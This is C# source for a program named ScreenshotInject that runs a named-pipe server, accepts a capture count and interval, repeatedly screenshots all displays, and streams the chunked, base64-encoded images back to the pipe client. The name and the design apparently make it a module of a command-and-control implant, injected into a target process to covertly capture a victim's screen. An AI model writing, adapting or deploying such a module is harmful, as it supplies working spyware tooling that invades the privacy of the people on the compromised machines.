using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using PhantomInterop.Serializers;
using System.Collections.Concurrent;
using PhantomInterop.Classes;
using System.Threading;
using PhantomInterop.Classes.Core;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Interfaces;
using ST = System.Threading.Tasks;
using PhantomInterop.Enums.PhantomEnums;
using System.IO.Pipes;
using PhantomInterop.Constants;
using PhantomInterop.Classes.Events;

namespace ScreenshotInject
{
    class Runtime
    {

        private static JsonHandler _dataSerializer = new JsonHandler();
        private static string _namedPipeName;
        private static ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private static ConcurrentQueue<ICommandMessage> _recieverQueue = new ConcurrentQueue<ICommandMessage>();
        private static AsyncNamedPipeServer _server;
        private static AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private static AutoResetEvent _msgRecvEvent = new AutoResetEvent(false);
        private static ConcurrentDictionary<string, ChunkStore<DataChunk>> DataStore = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
        private static CancellationTokenSource _cts = new CancellationTokenSource();
        private static Action<object> _transmitAction;
        private static ST.Task _clientConnectedTask = null;

        static void Main(string[] args)
        {

            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];

            _transmitAction = (object p) =>
            {
                PipeStream pipe = (PipeStream)p;

                while (pipe.IsConnected && !_cts.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[] {
                        _msgSendEvent,
                        _cts.Token.WaitHandle
                    });
                    if (_msgSendQueue.TryDequeue(out byte[] result))
                    {
                        pipe.BeginWrite(result, 0, result.Length, ProcessSentMessage, pipe);
                    }
                }
                pipe.Flush();
                pipe.Close();
            };
            _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.MessageReceived += ProcessReceivedMessage;
            _server.Disconnect += ServerDisconnect;
            _msgRecvEvent.WaitOne();
            if (_recieverQueue.TryDequeue(out ICommandMessage screenshotArgs))
            {
                if (screenshotArgs.GetTypeCode() != MessageType.IPCCommandArguments)
                {
                    throw new Exception($"Got invalid message type. Wanted {MessageType.IPCCommandArguments}, got {screenshotArgs.GetTypeCode()}");
                }
                uint count = 1;
                uint interval = 0;
                string[] parts = ((IPCCommandArguments)screenshotArgs).StringData.Split(' ');
                if (parts.Length > 0)
                {
                    count = uint.Parse(parts[0]);
                }
                if (parts.Length > 1)
                {
                    interval = uint.Parse(parts[1]);
                }
                for(int i = 0; i < count && !_cts.IsCancellationRequested; i++)
                {
                    byte[][] screens = Screenshot.GetScreenshots();
                    foreach(byte[] bScreen in screens)
                    {
                        AddToSenderQueue(new ScreenshotInformation(bScreen));
                    }
                    try
                    {
                        _cts.Token.WaitHandle.WaitOne((int)interval * 1000);
                    } catch (OperationCanceledException)
                    {
                        break;
                    }
                }
                while(_msgSendQueue.Count > 0)
                {
                    Thread.Sleep(1000);
                }
                _cts.Cancel();
            }


        }

        private static void ServerDisconnect(object sender, PipeMessageData e)
        {
            _cts.Cancel();
        }

        private static bool AddToSenderQueue(ICommandMessage msg)
        {
            DataChunk[] parts = _dataSerializer.SerializeIPCMessage(msg, IPC.SEND_SIZE / 2);
            foreach(DataChunk part in parts)
            {
                _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(_dataSerializer.Serialize(part)));
            }
            _msgSendEvent.Set();
            return true;
        }

        private static void ProcessSentMessage(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            // Potentially delete this since theoretically the sender Task does everything
            if (_msgSendQueue.TryDequeue(out byte[] data))
            {
                pipe.BeginWrite(data, 0, data.Length, ProcessSentMessage, pipe);
            }
        }

        private static void ProcessReceivedMessage(object sender, PipeMessageData args)
        {
            DataChunk chunkedData = _dataSerializer.Deserialize<DataChunk>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (DataStore)
            {
                if (!DataStore.ContainsKey(chunkedData.ID))
                {
                    DataStore[chunkedData.ID] = new ChunkStore<DataChunk>();
                    DataStore[chunkedData.ID].MessageComplete += HandleIncomingData;
                }
            }
            DataStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void HandleIncomingData(object sender, ChunkEventData<DataChunk> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _msgRecvEvent.Set();
        }

        public static void OnAsyncConnect(object sender, PipeMessageData args)
        {
            // We only accept one connection at a time, sorry.
            if (_clientConnectedTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _clientConnectedTask = new ST.Task(_transmitAction, args.Pipe);
            _clientConnectedTask.Start();
        }
    }
}
